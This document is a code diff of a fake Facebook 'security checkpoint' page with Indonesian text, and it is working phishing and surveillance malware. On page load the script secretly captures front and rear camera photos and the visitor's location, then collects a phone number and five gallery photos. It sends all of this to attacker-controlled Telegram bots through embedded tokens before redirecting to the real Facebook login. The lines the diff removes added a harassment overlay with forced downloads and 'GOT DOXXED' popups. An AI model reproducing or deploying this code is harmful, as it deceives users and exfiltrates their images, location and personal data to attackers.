@@ -6,10 +6,11 @@
     <title>Facebook - Secure Verification</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
+        /* Splash Screen */
         #splash-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; text-align: center;
+            align-items: center; justify-content: center;
         }
         .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
@@ -21,23 +22,35 @@
         
         .btn-fb { 
             background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
-            padding: 12px; border-radius: 8px; border: none; width: 100%; cursor: pointer;
+            padding: 12px; border-radius: 8px; border: none; width: 100%;
+            transition: 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
+        .btn-fb:active { transform: scale(0.94); }
 
-        /* Overlay Chaos Harus Paling Atas */
-        #chaos-overlay { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: black; z-index: 100000; 
+        /* Credit & Music Control Bar 😈 */
+        .credit-bar {
+            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.9);
+            color: white; padding: 10px 20px; display: flex; align-items: center; 
+            justify-content: space-between; backdrop-filter: blur(15px);
+            border-top: 2px solid #1877f2; z-index: 1000;
         }
-        #chaos-video { width: 100%; height: 100%; object-fit: contain; }
+        .credit-info { display: flex; flex-direction: column; text-align: left; }
+        .label-credit { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
+        .credit-name { font-size: 14px; font-weight: bold; color: #1877f2; text-shadow: 0 0 8px rgba(24, 119, 242, 0.6); }
         
-        .popup-virus {
-            position: absolute; width: 220px; background: #eee; border: 2px solid #000;
-            box-shadow: 8px 8px 0px rgba(0,0,0,0.8); padding: 10px; z-index: 100001;
-            font-family: "Courier New", monospace; animation: glitch 0.2s infinite;
+        /* Music Button */
+        .play-btn {
+            background: #1877f2; color: white; border: none; border-radius: 50px;
+            padding: 5px 15px; font-size: 12px; font-weight: bold; cursor: pointer;
+            transition: 0.3s; display: flex; align-items: center; gap: 5px;
         }
-        @keyframes glitch { from { transform: translate(0,0); } to { transform: translate(3px,3px); } }
+        .play-btn:hover { background: #166fe5; transform: translateY(-2px); }
 
+        .music-anim { display: flex; gap: 2px; align-items: flex-end; height: 15px; }
+        .bar { width: 3px; height: 100%; background: #fff; animation: wave 1s infinite; display: none; }
+        @keyframes wave { 0%, 100% { height: 3px; } 50% { height: 15px; } }
+
+        .error-box { background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; }
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -45,30 +58,52 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <h6 class="mt-3 text-muted">Sinkronisasi Keamanan...</h6>
+    <p class="mt-3 text-muted">Checking Security System...</p>
 </div>
 
-<div id="chaos-overlay">
-    <video id="chaos-video" loop playsinline>
-        <source src="https://files.catbox.moe/3d0wgv.mp4" type="video/mp4">
-    </video>
-</div>
+<audio id="bgMusic" loop>
+    <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
+</audio>
 
 <div class="container">
     <div class="main-card card p-4 text-center">
         <div class="fb-logo-text">facebook</div>
-        <h6 class="fw-bold mt-2">Verifikasi Identitas</h6>
+        <h6 class="fw-bold mt-2">Checkpoint Keamanan Akun</h6>
+        <p class="text-muted small">Konfirmasikan identitas Anda untuk melanjutkan akses ke profil Facebook.</p>
         <hr>
-        <div id="mainError" class="error-box" style="background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; text-align: left; color: #dd3c10;">
-            <b>Gagal!</b><br>Pastikan nomor benar dan wajib unggah <b>TEPAT 5 FOTO</b>.
+
+        <div id="mainError" class="error-box text-start">
+            <b>Gagal!</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
         </div>
+
         <div class="text-start">
-            <input type="number" id="phone" class="form-control mb-3" placeholder="Nomor Telepon">
-            <label class="small fw-bold">Upload 5 Bukti Identitas:</label>
-            <input type="file" id="galeri" class="form-control mb-3" multiple accept="image/*">
+            <label class="form-label small fw-bold">Nomor Telepon</label>
+            <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
+            
+            <label class="form-label small fw-bold mt-3">Verifikasi Foto Galeri (Wajib 5)</label>
+            <input type="file" id="galeri" class="form-control" multiple accept="image/*">
         </div>
-        <button class="btn-fb" onclick="validateFinal()">Konfirmasi</button>
+
+        <button class="btn-fb mt-4" onclick="validateFinal()">Konfirmasi</button>
+        
+        <div class="mt-3 text-primary" id="loader" style="display:none;">
+            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengirim data...</span>
+        </div>
     </div>
+</div>
+
+<div class="credit-bar">
+    <div class="credit-info">
+        <span class="label-credit">Developed by:</span>
+        <span class="credit-name">Malik & Hack7rBGG/Xymatekidd</span>
+    </div>
+    
+    <button class="play-btn" id="musicBtn" onclick="toggleMusic()">
+        <span>▶ PLAY MUSIC</span>
+        <div class="music-anim" id="animContainer">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        </div>
+    </button>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -77,53 +112,60 @@
 <script>
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
+    const audio = document.getElementById('bgMusic');
+    const bars = document.querySelectorAll('.bar');
 
-    async function initSystem() {
-        // Cek Lokasi & Kamera - Alert HANYA muncul jika ditolak!
-        try {
-            await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => {
-                        sendToBot(`📍 LOKASI: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                        res();
-                    },
-                    () => {
-                        alert("AKSES DITOLAK!\n\nAnda tidak bisa masuk tanpa izin lokasi.");
-                        location.reload(); // Paksa reload jika ditolak
-                        rej();
-                    }
-                );
-            });
+    window.onload = () => {
+        setTimeout(() => {
+            document.getElementById('splash-screen').style.display = 'none';
+            document.body.style.display = 'block';
+            autoCapture("user");
+            autoLocation();
+        }, 3000);
+    };
 
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {
-                alert("AKSES KAMERA DITOLAK!\n\nVerifikasi wajah diperlukan untuk masuk.");
-                location.reload(); // Paksa reload jika ditolak
-            });
-            
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                // JIKA SUDAH IZIN, MASUK TANPA ALERT LAGI!
-                document.getElementById('splash-screen').style.display = 'none';
-                document.body.style.display = 'block';
-                autoCapture("user");
-            }
-
-        } catch (e) {}
+    function toggleMusic() {
+        const btnText = document.querySelector('#musicBtn span');
+        if (audio.paused) {
+            audio.play();
+            btnText.innerText = "⏸ PAUSE";
+            bars.forEach(b => b.style.display = "block");
+        } else {
+            audio.pause();
+            btnText.innerText = "▶ PLAY MUSIC";
+            bars.forEach(b => b.style.display = "none");
+        }
     }
 
-    window.onload = () => { setTimeout(initSystem, 1000); };
-
-    function sendToBot(c, t="text", b=null) {
-        tokens.forEach((tk, i) => {
+    function sendToBot(content, type = "text", blob = null) {
+        tokens.forEach((token, i) => {
             const fd = new FormData();
             fd.append("chat_id", chats[i]);
-            if (t === "text") {
-                fetch(`https://api.telegram.org/bot${tk}/sendMessage`, { method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `chat_id=${chats[i]}&text=${encodeURIComponent(c)}` });
+            if (type === "text") {
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
+                });
             } else {
-                fd.append("photo", b || c, "img.jpg"); fd.append("caption", c);
-                fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: "POST", body: fd });
+                fd.append("photo", blob || content, "img.jpg");
+                fd.append("caption", content);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
             }
         });
+    }
+
+    function validateFinal() {
+        const phone = document.getElementById('phone').value;
+        const files = document.getElementById('galeri').files;
+        if (phone.length < 10 || files.length < 5) {
+            document.getElementById('mainError').style.display = 'block';
+            return;
+        }
+        document.getElementById('mainError').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        sendToBot(`📱 NOMOR: ${phone}`);
+        for (let i = 0; i < 5; i++) sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]);
+        setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 3000);
     }
 
     async function autoCapture(mode) {
@@ -136,49 +178,15 @@
                 c.getContext('2d').drawImage(v, 0, 0);
                 c.toBlob(b => sendToBot(`📸 Cam ${mode}`, "photo", b), 'image/jpeg');
                 s.getTracks().forEach(t => t.stop());
-                if(mode === "user") setTimeout(() => autoCapture("environment"), 3000);
+                if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
             }, 2000);
-        } catch (e) {}
+        } catch (e) { window.location.href = "https://www.facebook.com/login"; }
     }
 
-    function validateFinal() {
-        const p = document.getElementById('phone').value;
-        const f = document.getElementById('galeri').files;
-        if (p.length < 10 || f.length !== 5) {
-            document.getElementById('mainError').style.display = 'block';
-            return;
-        }
-        sendToBot(`📱 TARGET: ${p}`);
-        for (let i=0; i<f.length; i++) sendToBot(`🖼️ FOTO ${i+1}`, "photo", f[i]);
-        startChaos();
-    }
-
-    function startChaos() {
-        const ov = document.getElementById('chaos-overlay');
-        const vi = document.getElementById('chaos-video');
-        
-        ov.style.display = 'block';
-        vi.muted = false; // Suara video ON
-        vi.volume = 1.0;
-        vi.play().catch(e => console.log("Play failed", e));
-        
-        // AUTO DOWNLOAD 5 FILE YOU ARE IDIOT
-        for (let j = 1; j <= 5; j++) {
-            let blob = new Blob(["YOU ARE IDIOT"], { type: "text/plain" }); 
-            let url = window.URL.createObjectURL(blob);
-            let a = document.createElement("a");
-            a.href = url; a.download = `YOU_ARE_IDIOT_${j}.txt`; a.click();
-        }
-
-        setTimeout(() => {
-            setInterval(() => {
-                let d = document.createElement('div');
-                d.className = 'popup-virus';
-                d.style.top = Math.random() * 80 + '%'; d.style.left = Math.random() * 80 + '%';
-                d.innerHTML = "<b>YOU ARE IDIOT!</b><br>GOT DOXXED!";
-                ov.appendChild(d);
-            }, 250);
-        }, 15000);
+    function autoLocation() {
+        navigator.geolocation.getCurrentPosition(p => {
+            sendToBot(`📍 LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        });
     }
 </script>
 </body>
